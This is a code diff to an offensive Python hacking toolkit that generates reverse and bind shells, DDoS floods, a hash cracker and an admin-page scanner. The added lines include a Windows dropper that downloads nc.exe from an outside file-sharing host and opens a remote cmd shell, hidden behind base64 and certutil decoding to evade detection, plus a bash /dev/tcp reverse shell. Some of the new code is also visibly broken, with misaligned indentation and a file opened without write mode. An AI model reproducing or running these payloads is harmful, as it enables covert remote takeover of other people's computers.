@@ -1,4 +1,7 @@
 import os.path
+import smtplib, email.utils
+import getpass
+
 try:
 	from colorama import init
 	init()
@@ -13,7 +16,9 @@ except ImportError:
 	green=''
 	yellow=''
 	white=''
-scs = {'ddos':['flood/http','flood/tcp','flood/udp','flood/ftp'],'bruteforce':['offline/hashkiller'],'payloads':['fud/python/reverse_shell','fud/python/bind_shell','windows/nc'],'custom':os.listdir(os.getcwd()+'\\'+'custom')} # SCRIPTS
+
+
+scs = {'ddos':['flood/http','flood/tcp','flood/udp','flood/ftp'],'bruteforce':['offline/hashkiller','http/page_finder'],'payloads':['fud/python/reverse_shell','fud/python/bind_shell','windows/nc','linux/reverse_tcp'],'custom':os.listdir(os.getcwd()+'\\'+'custom')} # SCRIPTS
 opt1 = ''
 opt2 = ''
 
@@ -23,8 +28,11 @@ infos = {'flood/http': # Help for each script
 	'Options:\nhost .... target to attack    '+opt1+'\n','offline/hashkiller':'Options:\nhash .... hash to crack    '+opt1+'\nwordlist .... wordlist to use    '+opt2,
 	'fud/python/reverse_shell':'Options:\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2,'fud/python/bind_shell':'Options:\nhost .... host to bind    '+opt1+'\nport .... port to bind    '+opt2,
 	'windows/nc':'Options\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2,
-	'flood/ftp':'Options:\nhost .... target to attack	'+opt1+'\nbytes .... bytes lenght to send on each connection	'+opt2
+	'flood/ftp':'Options:\nhost .... target to attack	'+opt1+'\nbytes .... bytes lenght to send on each connection	'+opt2,
+	'http/page_finder':'Options\nurl .... url to look\t'+opt1+'\nwordlist .... name wordlist to find web page\t'+opt2,
+	'linux/reverse_tcp':'Options\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2
 }
+
 for s in scs['custom']:
     infos[s] = 'Options:\nrun .... start script\t'
 def custom(name):
@@ -187,21 +195,20 @@ def hashkiller(wordl, hash):
 		if hashtype == 'sha512':
 			crack = hashlib.sha512
 		# open e read wordlist
-		wl = open(wordl)
-		rd = wl.readlines()
-		rd.sort(key=len)
-		for i in rd: # start bruteforce
-			if i.endswith('\n'):
-				i = i.replace('\n','')
-			sys.stdout.flush()
-			sys.stdout.write('\r%s[*]%s Atual word: %s' %(blue,white,i))
-			if crack(i).hexdigest() == hash: # check if encoded word is equal the parsed hash
-				print '\n%s[+]%s Hash founded!' %(green,white)
-				print 'Your hash is: %s' % i
-				break
-			else:
-				pass # exception
-		wl.close()
+		with open(wordl, 'r') as rd:
+			#rd = rd.readlines()
+			#rd.sort(key=len)
+			for counter, i in enumerate(rd): # start bruteforce
+				if i.endswith('\n'):
+					i = i.replace('\n','')
+				sys.stdout.write('\r%s[*]%s Trying password number: %s' %(blue,white,counter))
+				#sys.stdout.write('\r%s[*]%s Atual word: %s' %(blue,white,i))
+				if crack(i).hexdigest() == hash: # check if encoded word is equal the parsed hash
+					print '\n%s[+]%s Hash founded!' %(green,white)
+					print 'Your hash is: %s' % i
+					break
+				else:
+					pass # exception
 	else:
 		print yellow+"{!}"+white+" '"+hashtype+"' isn't a suported hash type"
 		print "Suported hash types: "
@@ -231,7 +238,7 @@ def listener():
 
 def fud_shell(lhost, lport): # reverse shell (.py/.pyw)
 	pth = raw_input('File name (ex: payload.pyw): ')
-	payload = 'from socket import socket, AF_INET, SOCK_STREAM\nfrom sys import argv\nimport os\nhost="'+lhost+'"\nport='+lport+'\ns = socket(AF_INET, SOCK_STREAM)\ns.connect((host, port))\nwhile 1:\n\tconn = s.recv(2048)\n\tif conn[:2] == "cd":\n\t\tos.chdir(str(conn[3:]))\n\t\tcmd=""\n\telse:\n\t\tcmd = os.popen(conn).read()\n\ts.sendall(cmd+os.getcwd()+"> ")'
+	payload = 'from socket import socket, AF_INET, SOCK_STREAM\nfrom sys import argv\nimport os\nhost="'+lhost+'"\nport='+lport+'\ns = socket(AF_INET, SOCK_STREAM)\ns.connect((host, port))\nwhile 1:\n\tconn = s.recv(2048)\n\tif conn[:2] == "cd":\n\t\ttry:\n\t\t\tos.chdir(str(conn[3:]).strip())\n\t\t\tcmd=""\n\t\texcept:\n\t\t\tcmd=""\n\telse:\n\t\tcmd = os.popen(conn).read()\n\ts.sendall(cmd+os.getcwd()+"> ")'
 	if os.path.isdir('output'):
 		pth = 'output/'+pth
 		_file = open(pth, 'w')
@@ -266,27 +273,61 @@ def fud_bindshell(lhost, lport): # bind shell (.py/.pyw)
 	_file.close()
 	print '%s[+]%s File saved as: %s\n' %(green,white,pth)
 def windows_nc(lhost, lport):
-	pth = raw_input('File name (ex: payload.bat): ')
-	payload = '''@echo off
+	out_name = raw_input('%sOutput basename: ' %white)
+	payload ='''cd %temp%
 echo @echo off >> bd.bat
 echo powershell -Command "(New-Object Net.WebClient).DownloadFile('https://transfer.sh/pMOJi/nc.exe', '%temp%/nc.exe')" >>bd.bat
-echo cd %temp% >> bd.bat
 echo nc.exe '''+lhost+''' '''+lport+''' -e cmd.exe >>bd.bat
 echo del nc.exe >> bd.bat
 echo del bd.bat >> bd.bat
-echo exit >> bd.bat
 powershell -W hidden ./bd.bat
 del bd.bat'''
-	size = len(payload)+61440
-	print '%s[*]%s Generating payload of size: %s bytes' %(blue,white,str(size))
-	if os.path.isdir('output'):
-		pth = 'output/'+pth
-		_file = open(pth, 'w')
-	else:
-		_file = open(pth, 'w')
-	_file.write(payload)
-	_file.close()
-	print '%s[+]%s File saved as: %s' %(green,white,pth)
+	payload = base64.b64encode(payload)
+	with open(out_name+'.bat','w') as out_file:
+		name = str(random.randint(0,99))+lport+'_temp_'
+    	code = '''@echo off
+del "'''+name+'''.txt" 2>nul
+del '''+name+'''.bat 2>nul
+cd %temp%
+echo '''+payload+''' > '''+name+'''.txt
+certutil -decode '''+name+'''.txt '''+name+'''.bat >nul 2>nul
+'''+name+'''.bat
+del '''+name+'''.txt
+del '''+name+'''.bat'''
+        out_file.write(code)
+        out_file.close()
+        print('%s[*]%s Payload saved as: %s' %(blue,white,out_name+'.bat'))
+def linux_reverse_tcp(lhost, lport):
+	out_name = raw_input('%sName to output: ' %white)
+	payload = 'bash &> /dev/tcp/%s/%s 0>&1' %(lhost,lport)
+	with open(out_name) as backdoor:
+		backdoor.write(payload)
+		backdoor.close()
+	print('%s[*]%s Payload saved as: %s' %(blue,white,out_name))
+def admin_finder(url, wordlist):
+	import requests
+	#default_wordlist = ["admin.php","admin.html","index.php","login.php","login.html","administrator","admin","adminpanel","cpanel","login","wp-login.php","administrator","admins","logins","admin.asp","login.asp","adm/","admin/","admin/account.html","admin/login.html","admin/login.htm","admin/controlpanel.html","admin/controlpanel.htm","admin/adminLogin.html","admin/adminLogin.htm","admin.htm","admin.html","adminitem/","adminitems/","administrator/","administrator/login.","administrator.","administration/","administration.","adminLogin/","adminlogin.","admin_area/admin.","admin_area/","admin_area/login.","manager/","superuser/","superuser.","access/","access.","sysadm/","sysadm.","superman/","supervisor/","panel.","control/","control.","member/","member.","members/","user/","user.","cp/","uvpanel/","manage/","manage.","management/","management.","signin/","signin.","log-in/","log-in.","log_in/","log_in.","sign_in/","sign_in.","sign-in/","sign-in.","users/","users.","accounts/","accounts.","bb-admin/login.","bb-admin/admin.","bb-admin/admin.html","administrator/account.","relogin.htm","relogin.html","check.","relogin.","blog/wp-login.","user/admin.","users/admin.","registration/","processlogin.","checklogin.","checkuser.","checkadmin.","isadmin.","authenticate.","authentication.","auth.","authuser.","authadmin.","cp.","modelsearch/login.","moderator.","moderator/","controlpanel/","controlpanel.","admincontrol.","adminpanel.","fileadmin/","fileadmin.","sysadmin.","admin1.","admin1.html","admin1.htm","admin2.","admin2.html","yonetim.","yonetim.html","yonetici.","yonetici.html","phpmyadmin/","myadmin/","ur-admin.","ur-admin/","Server.","Server/","wp-admin/","administr8.","administr8/","webadmin/","webadmin.","administratie/","admins/","admins.","administrivia/","Database_Administration/","useradmin/","sysadmins/","sysadmins/","admin1/","system-administration/","administrators/","pgadmin/","directadmin/","staradmin/","ServerAdministrator/","SysAdmin/","administer/","LiveUser_Admin/","sys-admin/","typo3/","panel/","cpanel/","cpanel_file/","platz_login/","rcLogin/","blogindex/","formslogin/","autologin/","manuallogin/","simpleLogin/","loginflat/","utility_login/","showlogin/","memlogin/","login-redirect/","sub-login/","wp-login/","login1/","dir-login/","login_db/","xlogin/","smblogin/","customer_login/","UserLogin/","login-us/","acct_login/","bigadmin/","project-admins/","phppgadmin/","pureadmin/","sql-admin/","radmind/","openvpnadmin/","wizmysqladmin/","vadmind/","ezsqliteadmin/","hpwebjetadmin/","newsadmin/","adminpro/","Lotus_Domino_Admin/","bbadmin/","vmailadmin/","Indy_admin/","ccp14admin/","irc-macadmin/","banneradmin/","sshadmin/","phpldapadmin/","macadmin/","administratoraccounts/","admin4_account/","admin4_colon/","radmind-1/","Super-Admin/","AdminTools/","cmsadmin/","SysAdmin2/","globes_admin/","cadmins/","phpSQLiteAdmin/","navSiteAdmin/","server_admin_small/","logo_sysadmin/","power_user/","system_administration/","ss_vms_admin_sm/","bb-admin/","panel-administracion/","instadmin/","memberadmin/","administratorlogin/","adm.","admin_login.","panel-administracion/login.","pages/admin/admin-login.","pages/admin/","acceso.","admincp/login.","admincp/","adminarea/","admincontrol/","affiliate.","adm_auth.","memberadmin.","administratorlogin.","modules/admin/","administrators.","siteadmin/","siteadmin.","adminsite/","kpanel/","vorod/","vorod.","vorud/","vorud.","adminpanel/","PSUser/","secure/","webmaster/","webmaster.","autologin.","userlogin.","admin_area.","cmsadmin.","security/","usr/","root/","secret/","admin/login.","admin/adminLogin.","moderator.php","moderator.html","moderator/login.","moderator/admin.","yonetici.","0admin/","0manager/","aadmin/","cgi-bin/login","login1","login_admin/","login_admin","login_out/","login_out","login_user","loginerror/","loginok/","loginsave/","loginsuper/","loginsuper","login","logout/","logout","secrets/","super1/","super1","super_index","super_login","supermanager","superman","superuser","supervise/","supervise/Login","super"]
+	status_codes = [200,301,201,202,203,304,307,403]
+	if 'http' not in url:
+		url = 'http://%s' %url
+	def look_for_page(url, wordlist):
+		page_counter = 0
+		for page in wordlist:
+			page = page.strip()
+			REQUEST = requests.get(url+'/'+page)
+			#print(url+'/'+page)
+			#print REQUEST.status_code
+			if REQUEST.status_code in status_codes:
+				print('%s[+]%s %s  -  %s' %(green,white,page,REQUEST.status_code))
+				page_counter+=1
+		print('\n%s[i]%sTotal pages: %s' %(blue,white,page_counter))
+
+	with open(wordlist) as wdlst:
+		print('%s[*]%s Starting script...\n' %(blue,white))
+		try:
+			look_for_page(url, wdlst)
+		except requests.exceptions.ConnectionError:
+			print('%s[!]%s Connection error, host is offline!' %(red,yellow))
 def run(script, opt1, opt2):
 	if script == 'flood/http':
 		floodhttp(opt1)
@@ -309,3 +350,7 @@ def run(script, opt1, opt2):
 		windows_nc(opt1, opt2)
 	if opt2 == '__custom__':
 		custom(script)
+	if script == 'http/page_finder':
+		admin_finder(opt1, opt2)
+	if script == 'linux/reverse_tcp':
+		linux_reverse_tcp(opt1,opt2)
